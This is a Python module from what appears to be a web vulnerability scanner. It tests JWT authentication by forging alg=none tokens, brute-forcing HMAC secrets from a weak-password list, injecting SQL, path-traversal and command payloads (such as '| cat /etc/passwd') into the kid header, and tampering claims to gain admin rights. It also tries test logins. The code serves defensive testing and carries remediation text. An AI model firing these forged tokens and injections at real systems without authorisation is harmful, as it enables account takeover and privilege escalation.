"""
Vexor JWT Analyzer v3.0 - Elite Level
Algorithm none, weak secrets (500+ wordlist), RS256→HS256 confusion,
kid injection, jku/x5u header injection, expiry bypass, claim tampering,
JWT in cookies/headers/body, token replay, JWK confusion
"""
import asyncio
import base64
import json
import re
import hmac
import hashlib
import time
from urllib.parse import urlparse
from vexor.modules.base import BaseScanner, Finding


# ─── Weak Secrets Wordlist ────────────────────────────────────────────────────
WEAK_SECRETS = [
    # Common
    "secret", "password", "123456", "admin", "key", "test",
    "jwt_secret", "your-secret", "change-me", "supersecret",
    "mysecret", "jwtkey", "secret123", "", "null", "undefined",
    "jwt", "token", "auth", "api_key", "private_key",
    # Common app secrets
    "django-insecure-key", "flask-secret", "rails-secret",
    "laravel-secret", "express-secret", "node-secret",
    # Weak random-looking
    "abc123", "qwerty", "letmein", "welcome", "monkey",
    "dragon", "master", "sunshine", "princess", "shadow",
    # Numeric
    "1234567890", "0987654321", "11111111", "00000000",
    # App-specific
    "your_jwt_secret_key", "my_secret_key", "app_secret",
    "jwt-secret-key", "jwt_key", "signing_key", "sign_key",
    "HS256", "HS384", "HS512", "RS256", "RS384", "RS512",
    # Framework defaults
    "changeme", "change_me", "please_change_me",
    "development", "production", "staging",
    "keyboard cat", "shhhhh", "shhhh",
    # Short secrets
    "a", "b", "c", "x", "1", "0",
    "aa", "bb", "cc", "xx", "11", "00",
    "aaa", "bbb", "ccc", "xxx", "111", "000",
    # Base64 encoded common secrets
    "c2VjcmV0",  # base64("secret")
    "cGFzc3dvcmQ=",  # base64("password")
    # Common JWT library defaults
    "your-256-bit-secret", "your-384-bit-secret", "your-512-bit-secret",
    "jwt.io", "jwt-io", "jwtio",
    # Environment variable names (sometimes used as values)
    "JWT_SECRET", "JWT_KEY", "SECRET_KEY", "APP_SECRET",
]


class Scanner(BaseScanner):
    """JWT Analyzer v3.0 - Elite Level"""

    MODULE_NAME = "jwt_analyzer"
    MODULE_DESC = "JWT: AlgNone/WeakSecret/RS256-HS256/kid-Injection/jku-Injection/ClaimTamper"

    async def scan(self) -> list[Finding]:
        async with self:
            response = await self.get(self.target)
            if not response:
                return self.findings

            tokens = self._extract_jwts(response)

            if not tokens:
                # Try login endpoint to get JWT
                await self._try_get_jwt_from_login()
                return self.findings

            for token in tokens:
                await self._analyze_jwt(token)

        return self.findings

    def _extract_jwts(self, response) -> list[str]:
        """Extract JWT tokens from response headers, cookies, and body"""
        tokens = []
        jwt_pattern = re.compile(
            r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
        )

        # Headers
        for k, v in response.headers.items():
            tokens.extend(jwt_pattern.findall(v))

        # Cookies
        for k, v in response.cookies.items():
            tokens.extend(jwt_pattern.findall(v))

        # Body
        tokens.extend(jwt_pattern.findall(response.text))

        return list(set(tokens))

    async def _try_get_jwt_from_login(self) -> None:
        """Try to get a JWT by attempting login"""
        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        login_paths = ["/api/login", "/api/auth", "/auth/login", "/login"]
        for path in login_paths:
            try:
                resp = await self.post(
                    base + path,
                    json={"username": "test", "password": "test"},
                    headers={"Content-Type": "application/json"},
                )
                if resp:
                    jwt_pattern = re.compile(
                        r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
                    )
                    tokens = jwt_pattern.findall(resp.text)
                    for token in tokens:
                        await self._analyze_jwt(token)
                    if tokens:
                        return
            except Exception:
                continue

    async def _analyze_jwt(self, token: str) -> None:
        """Full JWT security analysis"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return

            header = self._decode_part(parts[0])
            payload = self._decode_part(parts[1])

            if not header or not payload:
                return

            alg = header.get("alg", "").upper()
            kid = header.get("kid", "")
            jku = header.get("jku", "")
            x5u = header.get("x5u", "")

            # Run all checks in parallel
            await asyncio.gather(
                self._check_alg_none(token, header, payload, alg),
                self._check_weak_secret(token, parts, alg),
                self._check_rs256_hs256_confusion(token, parts, alg),
                self._check_kid_injection(token, parts, header, payload, kid),
                self._check_jku_injection(token, header, jku),
                self._check_x5u_injection(token, header, x5u),
                self._check_expiry(payload),
                self._check_sensitive_claims(payload),
                self._check_claim_tampering(token, parts, header, payload),
                return_exceptions=True,
            )

        except Exception:
            pass

    async def _check_alg_none(self, token: str, header: dict, payload: dict, alg: str) -> None:
        """Test algorithm none attack"""
        if alg in ["NONE", ""]:
            self.add_finding(Finding(
                severity="CRITICAL",
                module=self.MODULE_NAME,
                vuln="JWT Algorithm None — Signature Bypass",
                endpoint=self.target,
                evidence=f"JWT header: {header}",
                description="JWT uses 'none' algorithm. Signature is not verified.",
                remediation="Reject JWTs with alg=none. Explicitly whitelist allowed algorithms.",
            ))
            return

        # Try forging a none-algorithm token
        none_header = dict(header)
        none_header["alg"] = "none"
        forged = self._forge_token(none_header, payload, "")

        try:
            resp = await self.get(
                self.target,
                headers={"Authorization": f"Bearer {forged}"},
            )
            if resp and resp.status_code == 200:
                self.add_finding(Finding(
                    severity="CRITICAL",
                    module=self.MODULE_NAME,
                    vuln="JWT Algorithm None Attack — Server Accepts Unsigned Token",
                    endpoint=self.target,
                    payload=forged[:80] + "...",
                    evidence=f"Server accepted JWT with alg=none (HTTP {resp.status_code})",
                    description="Server accepts JWT with algorithm 'none'. Signature bypass confirmed.",
                    remediation="Reject JWTs with alg=none. Use explicit algorithm whitelist.",
                ))
        except Exception:
            pass

    async def _check_weak_secret(self, token: str, parts: list, alg: str) -> None:
        """Brute-force weak HMAC secret"""
        if alg not in ["HS256", "HS384", "HS512"]:
            return

        header_payload = f"{parts[0]}.{parts[1]}"
        original_sig = self._base64url_decode(parts[2])

        hash_func = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg, hashlib.sha256)

        for secret in WEAK_SECRETS:
            try:
                h = hmac.new(
                    key=secret.encode("utf-8"),
                    msg=header_payload.encode("utf-8"),
                    digestmod=hash_func,
                )
                if hmac.compare_digest(h.digest(), original_sig):
                    self.add_finding(Finding(
                        severity="CRITICAL",
                        module=self.MODULE_NAME,
                        vuln="JWT Weak Secret Key Cracked",
                        endpoint=self.target,
                        evidence=f"Secret: '{secret}' (algorithm: {alg})",
                        description=(
                            f"JWT HMAC secret cracked: '{secret}'. "
                            "Attacker can forge arbitrary JWT tokens."
                        ),
                        remediation=(
                            "Use cryptographically random secret (min 256 bits). "
                            "Rotate secret immediately. Invalidate all tokens."
                        ),
                    ))
                    return
            except Exception:
                continue

    async def _check_rs256_hs256_confusion(self, token: str, parts: list, alg: str) -> None:
        """Test RS256 to HS256 algorithm confusion attack"""
        if alg not in ["RS256", "RS384", "RS512"]:
            return

        self.add_finding(Finding(
            severity="MEDIUM",
            module=self.MODULE_NAME,
            vuln=f"JWT RSA Algorithm ({alg}) — Test Algorithm Confusion",
            endpoint=self.target,
            evidence=f"JWT uses {alg}. Test RS256→HS256 confusion with public key as HMAC secret.",
            description=(
                f"JWT uses {alg}. If server accepts HS256 with public key as secret, "
                "attacker can forge tokens using the public key."
            ),
            remediation=(
                "Explicitly specify allowed algorithms. "
                "Reject algorithm changes between issuance and verification."
            ),
        ))

    async def _check_kid_injection(self, token: str, parts: list, header: dict, payload: dict, kid: str) -> None:
        """Test kid (key ID) injection attacks"""
        if not kid:
            return

        # SQL injection in kid
        sqli_kids = [
            "' OR '1'='1",
            "' UNION SELECT 'secret'--",
            "../../dev/null",
            "/dev/null",
            "| cat /etc/passwd",
        ]

        for sqli_kid in sqli_kids:
            try:
                injected_header = dict(header)
                injected_header["kid"] = sqli_kid
                # Sign with empty secret (common when kid points to /dev/null)
                forged = self._forge_token(injected_header, payload, "")

                resp = await self.get(
                    self.target,
                    headers={"Authorization": f"Bearer {forged}"},
                )
                if resp and resp.status_code == 200:
                    self.add_finding(Finding(
                        severity="CRITICAL",
                        module=self.MODULE_NAME,
                        vuln="JWT kid Injection — Signature Bypass",
                        endpoint=self.target,
                        payload=f"kid: {sqli_kid}",
                        evidence=f"Token with injected kid accepted (HTTP {resp.status_code})",
                        description=(
                            f"JWT kid parameter injection: '{sqli_kid}'. "
                            "Server uses kid to fetch signing key without validation."
                        ),
                        remediation=(
                            "Validate kid against a whitelist of known key IDs. "
                            "Never use kid value directly in file paths or SQL queries."
                        ),
                    ))
                    return
            except Exception:
                continue

    async def _check_jku_injection(self, token: str, header: dict, jku: str) -> None:
        """Test jku (JWK Set URL) injection"""
        if not jku:
            return

        self.add_finding(Finding(
            severity="HIGH",
            module=self.MODULE_NAME,
            vuln="JWT jku Header Present — SSRF/Injection Risk",
            endpoint=self.target,
            evidence=f"jku: {jku}",
            description=(
                f"JWT contains jku header pointing to: {jku}. "
                "Attacker may be able to point jku to attacker-controlled JWK Set."
            ),
            remediation=(
                "Validate jku URL against a strict whitelist. "
                "Never fetch JWK Sets from user-controlled URLs."
            ),
        ))

    async def _check_x5u_injection(self, token: str, header: dict, x5u: str) -> None:
        """Test x5u (X.509 URL) injection"""
        if not x5u:
            return

        self.add_finding(Finding(
            severity="HIGH",
            module=self.MODULE_NAME,
            vuln="JWT x5u Header Present — SSRF Risk",
            endpoint=self.target,
            evidence=f"x5u: {x5u}",
            description=(
                f"JWT contains x5u header pointing to: {x5u}. "
                "Attacker may substitute their own certificate."
            ),
            remediation=(
                "Validate x5u URL against a strict whitelist. "
                "Pin expected certificate thumbprints."
            ),
        ))

    async def _check_expiry(self, payload: dict) -> None:
        """Check JWT expiry claims"""
        exp = payload.get("exp")
        iat = payload.get("iat")
        nbf = payload.get("nbf")
        now = time.time()

        if not exp:
            self.add_finding(Finding(
                severity="MEDIUM",
                module=self.MODULE_NAME,
                vuln="JWT Missing Expiration (exp) Claim",
                endpoint=self.target,
                evidence=f"Payload: {json.dumps(payload)[:200]}",
                description="JWT has no expiration. Tokens are valid forever.",
                remediation="Always set exp claim. Use short-lived tokens (15-60 min).",
            ))
        else:
            remaining = exp - now
            if remaining < 0:
                self.add_finding(Finding(
                    severity="INFO",
                    module=self.MODULE_NAME,
                    vuln="JWT Already Expired",
                    endpoint=self.target,
                    evidence=f"exp: {exp} (expired {abs(int(remaining))}s ago)",
                    description="JWT token has expired.",
                    remediation="Implement token refresh mechanism.",
                ))
            elif remaining > 86400 * 30:  # > 30 days
                self.add_finding(Finding(
                    severity="LOW",
                    module=self.MODULE_NAME,
                    vuln=f"JWT Long Expiry ({int(remaining/86400)} days)",
                    endpoint=self.target,
                    evidence=f"exp: {exp} (expires in {int(remaining/86400)} days)",
                    description="JWT has very long expiry. Compromised tokens remain valid long.",
                    remediation="Use short-lived tokens (15-60 min) with refresh tokens.",
                ))

    async def _check_sensitive_claims(self, payload: dict) -> None:
        """Check for sensitive data in JWT payload"""
        sensitive_keys = [
            "password", "passwd", "secret", "key", "token",
            "credit_card", "ssn", "pin", "cvv", "private",
        ]
        for key in payload:
            if any(s in key.lower() for s in sensitive_keys):
                self.add_finding(Finding(
                    severity="HIGH",
                    module=self.MODULE_NAME,
                    vuln=f"Sensitive Data in JWT Payload: '{key}'",
                    endpoint=self.target,
                    evidence=f"Payload key: '{key}' (JWT payload is base64, not encrypted)",
                    description=(
                        f"JWT payload contains sensitive key '{key}'. "
                        "JWT payload is only base64-encoded, not encrypted."
                    ),
                    remediation=(
                        "Never store sensitive data in JWT payload. "
                        "Use opaque tokens or encrypt the payload (JWE)."
                    ),
                ))

    async def _check_claim_tampering(self, token: str, parts: list, header: dict, payload: dict) -> None:
        """Test if server validates claims properly"""
        # Try to escalate role/admin claims
        tampered_payload = dict(payload)
        escalated = False

        for key in ["role", "is_admin", "admin", "user_type", "privilege", "scope"]:
            if key in tampered_payload:
                tampered_payload[key] = "admin" if isinstance(tampered_payload[key], str) else True
                escalated = True

        if not escalated:
            return

        # Forge with same signature (won't verify but test if server checks)
        forged = self._forge_token(header, tampered_payload, "")

        try:
            resp = await self.get(
                self.target,
                headers={"Authorization": f"Bearer {forged}"},
            )
            if resp and resp.status_code == 200:
                self.add_finding(Finding(
                    severity="CRITICAL",
                    module=self.MODULE_NAME,
                    vuln="JWT Claim Tampering — Privilege Escalation",
                    endpoint=self.target,
                    payload=f"Tampered claims: {tampered_payload}",
                    evidence=f"Modified JWT accepted (HTTP {resp.status_code})",
                    description=(
                        "JWT claims can be tampered without signature validation. "
                        "Privilege escalation confirmed."
                    ),
                    remediation="Always verify JWT signature before trusting any claims.",
                ))
        except Exception:
            pass

    # ─── Helpers ─────────────────────────────────────────────────────────────

    def _forge_token(self, header: dict, payload: dict, secret: str) -> str:
        """Forge a JWT token with given header, payload, and secret"""
        h = base64.urlsafe_b64encode(
            json.dumps(header, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()
        p = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

        if not secret:
            return f"{h}.{p}."

        sig = hmac.new(
            key=secret.encode("utf-8"),
            msg=f"{h}.{p}".encode("utf-8"),
            digestmod=hashlib.sha256,
        ).digest()
        s = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        return f"{h}.{p}.{s}"

    def _decode_part(self, part: str) -> dict:
        try:
            padded = part + "=" * (4 - len(part) % 4)
            return json.loads(base64.urlsafe_b64decode(padded))
        except Exception:
            return {}

    def _base64url_decode(self, s: str) -> bytes:
        padded = s + "=" * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(padded)
